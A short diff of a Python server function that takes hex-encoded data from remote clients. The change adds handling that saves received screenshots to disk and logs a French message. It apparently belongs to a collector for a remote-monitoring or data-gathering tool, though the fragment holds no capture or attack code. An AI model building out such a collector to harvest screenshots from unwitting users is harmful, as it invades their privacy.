@@ -104,6 +104,14 @@ def process_data(data, client_ip):
             with open(file_path, "wb") as f:
                 f.write(bytes.fromhex(file_data))
             save_to_db(file_type, client_ip, file_data, file_path)
+            
+        elif file_type == "screenshot":
+            screenshot_dir = "screenshot"
+            os.makedirs(screenshot_dir, exist_ok=True)
+            file_path = os.path.join(screenshot_dir, filename)
+            with open(file_path, "wb") as f:
+                f.write(bytes.fromhex(file_data))
+            print(f"[+] Screenshot sauvegardé dans : {file_path}")       
 
         print(f"[+] Données '{file_type}' reçues et sauvegardées de {client_ip}")
 
